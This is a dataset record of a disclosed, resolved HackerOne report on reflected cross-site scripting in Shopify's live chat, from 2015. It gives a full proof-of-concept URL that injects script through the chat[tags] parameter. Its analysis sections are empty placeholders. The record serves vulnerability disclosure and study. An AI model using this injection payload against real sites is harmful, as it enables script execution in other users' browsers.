---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '73566'
original_report_id: '73566'
title: Reflected XSS in chat
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-07-01T23:40:29.545Z'
disclosed_at: '2015-08-11T16:02:24.281Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in chat

## Metadata

- HackerOne Report ID: 73566
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2015-08-11T16:02:24.281Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://livechat.shopify.com/customer/chats/new?chat%5Bemail%5D=mymail%40mail.com&chat%5Bname%5D=My+Name&utm_source=partner&chat%5Btags%5D=123%27%5D%29;alert%281%29;//&chat%5Bmetadata%5D%5Bshop_id%5D=90909090%22

Vulnerable param is **chat[tags]**. If fill it with **123']);alert(1);//** the XSS fill fire after click "Start chat@ button (screen).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
